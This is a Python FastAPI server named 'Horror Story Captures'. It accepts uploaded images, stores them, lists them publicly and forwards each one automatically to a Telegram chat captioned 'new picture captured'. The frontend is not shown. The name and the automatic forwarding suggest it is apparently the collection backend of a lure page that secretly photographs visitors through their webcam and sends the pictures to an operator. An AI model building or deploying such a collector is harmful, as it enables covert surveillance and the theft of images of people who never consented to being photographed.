import os
import asyncio
import io
import uuid
import sqlite3
from datetime import datetime
from pathlib import Path
from dotenv import load_dotenv  # <-- ADD THIS

from fastapi import FastAPI, File, UploadFile, HTTPException, Query, BackgroundTasks  # <-- ADD BackgroundTasks
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from PIL import Image
import httpx

# ─── LOAD ENVIRONMENT VARIABLES ──────────────────
load_dotenv()  # <-- ADD THIS - .env file se load karega

# ─── APP ──────────────────────────────────────────
app = FastAPI(title="Horror Story Captures")

# CORS – agar frontend alag port/domain par ho
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],          # Production mein apna domain daalna
    allow_methods=["*"],
    allow_headers=["*"],
)

# ─── TELEGRAM CONFIG (Environment se lo) ──────────
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Check if Telegram config is properly set
TELEGRAM_CONFIGURED = bool(BOT_TOKEN and CHAT_ID and BOT_TOKEN != "YOUR_BOT_TOKEN_HERE" and CHAT_ID != "YOUR_CHAT_ID_HERE")

if not TELEGRAM_CONFIGURED:
    print("  WARNING: Telegram configuration missing! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env file")
else:
    print(f" Telegram configured: Bot token present, Chat ID: {CHAT_ID[:5]}...")

# ─── STORAGE ──────────────────────────────────────
STORAGE_DIR = Path("static/captured")
STORAGE_DIR.mkdir(parents=True, exist_ok=True)

# Static files serve karo
app.mount("/static", StaticFiles(directory="static"), name="static")

# ─── SQLite (Permanent Metadata) ──────────────────
DB_PATH = "captures.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS images
                 (id TEXT PRIMARY KEY, filename TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

def save_meta(id: str, filename: str, timestamp: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO images VALUES (?,?,?)", (id, filename, timestamp))
    conn.commit()
    conn.close()

def get_all_meta():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, filename, timestamp FROM images ORDER BY timestamp DESC")
    rows = c.fetchall()
    conn.close()
    return [{"id": r[0], "filename": r[1], "timestamp": r[2]} for r in rows]

init_db()

# ─── IMAGE COMPRESSION ─────────────────────────────
def compress_image(image_bytes: bytes, max_size=(800, 800), quality=75):
    img = Image.open(io.BytesIO(image_bytes))
    if img.mode in ("RGBA", "P"):
        img = img.convert("RGB")
    img.thumbnail(max_size, Image.LANCZOS)
    out = io.BytesIO()
    img.save(out, format="JPEG", quality=quality, optimize=True)
    return out.getvalue()

# ─── TELEGRAM SEND (Improved) ────────────────────
async def send_photo_to_telegram(image_bytes: bytes, filename: str = "capture.jpg"):
    """Send photo to Telegram with better error handling and logging"""
    
    if not TELEGRAM_CONFIGURED:
        print(" Telegram not configured. Skipping send.")
        return False

    try:
        print(f" Sending photo to Telegram... (File: {filename})")
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            # Prepare the file
            files = {
                'photo': (filename, image_bytes, 'image/jpeg')
            }
            
            # Prepare the data
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            data = {
                'chat_id': CHAT_ID,
                'caption': f" नई तस्वीर कैप्चर हुई!\n🕐 समय: {current_time}\n📁 फ़ाइल: {filename}",
                'parse_mode': 'HTML'
            }
            
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            
            # Send the request
            resp = await client.post(url, data=data, files=files)
            
            # Check response
            if resp.status_code == 200:
                response_data = resp.json()
                if response_data.get('ok'):
                    print(f" Telegram photo sent successfully! Message ID: {response_data.get('result', {}).get('message_id')}")
                    return True
                else:
                    print(f" Telegram API error: {response_data.get('description', 'Unknown error')}")
                    return False
            else:
                print(f" Telegram HTTP error: Status {resp.status_code}, Response: {resp.text[:200]}")
                return False
                
    except httpx.TimeoutException:
        print(" Telegram timeout: Request took too long")
        return False
    except httpx.ConnectError:
        print(" Telegram connection error: Could not connect to Telegram API")
        return False
    except Exception as e:
        print(f" Telegram send failed: {type(e).__name__}: {str(e)}")
        return False

# ─── ENDPOINTS ──────────────────────────────────────

@app.post("/capture")
async def capture_image(
    file: UploadFile = File(...),
    background_tasks: BackgroundTasks = None  # <-- ADD BackgroundTasks
):
    try:
        contents = await file.read()
        if not contents:
            raise HTTPException(400, "Empty file")

        # 1. Compress
        compressed = compress_image(contents)

        # 2. Local save
        file_id = str(uuid.uuid4())[:8]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"capture_{timestamp}_{file_id}.jpg"
        filepath = STORAGE_DIR / filename
        with open(filepath, "wb") as f:
            f.write(compressed)

        # 3. DB metadata
        save_meta(file_id, filename, timestamp)

        # 4. Telegram background - IMPROVED
        if TELEGRAM_CONFIGURED:
            # Create a background task
            background_tasks.add_task(
                send_photo_to_telegram, 
                compressed, 
                filename
            )
            print(f" Telegram task added to background queue for {filename}")
        else:
            print(f"ℹ Telegram not configured, skipping send for {filename}")

        return {
            "success": True, 
            "id": file_id, 
            "filename": filename,
            "telegram_sent": TELEGRAM_CONFIGURED
        }

    except Exception as e:
        print(f" Capture failed: {str(e)}")
        raise HTTPException(500, f"Processing failed: {str(e)}")


@app.get("/images")
async def get_images(offset: int = Query(0, ge=0), limit: int = Query(6, ge=1, le=20)):
    all_meta = get_all_meta()
    paginated = all_meta[offset:offset + limit]
    result = [
        {
            "id": m["id"],
            "url": f"/static/captured/{m['filename']}",
            "timestamp": m["timestamp"]
        }
        for m in paginated
    ]
    return {
        "images": result,
        "total": len(all_meta),
        "offset": offset,
        "limit": limit,
        "has_more": offset + limit < len(all_meta)
    }


@app.get("/share/{file_id}")
async def share_image(file_id: str):
    for meta in get_all_meta():
        if meta["id"] == file_id:
            return FileResponse(STORAGE_DIR / meta["filename"])
    raise HTTPException(404, "Image not found")

# ─── HEALTH CHECK ──────────────────────────────────
@app.get("/health")
async def health_check():
    """Health check endpoint to verify Telegram config"""
    return {
        "status": "healthy",
        "telegram_configured": TELEGRAM_CONFIGURED,
        "bot_token_present": bool(BOT_TOKEN),
        "chat_id_present": bool(CHAT_ID)
    }

# ─── RUN ──────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
